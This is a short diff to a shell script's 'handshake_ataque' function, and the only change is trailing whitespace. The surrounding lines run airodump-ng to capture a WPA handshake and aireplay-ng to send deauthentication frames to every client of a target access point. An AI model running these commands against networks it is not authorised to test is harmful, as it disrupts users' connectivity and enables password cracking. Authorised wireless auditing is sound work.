@@ -175,7 +175,7 @@ handshake_ataque() {
 	xterm -hold -e "airodump-ng -c $channel -w Handshake --essid $ap $tar" &
 	airodump_filter_xterm_PID=$!
 
-	sleep 2; xterm -hold -e "aireplay-ng -0 10 -e $ap -c FF:FF:FF:FF:FF:FF $tar" &								
+	sleep 2; xterm -hold -e "aireplay-ng -0 10 -e $ap -c FF:FF:FF:FF:FF:FF $tar" &
 	aireplay_xterm_PID=$!
 	sleep 10; kill -9 $aireplay_xterm_PID; wait $aireplay_xterm_PID 2>/dev/null
 
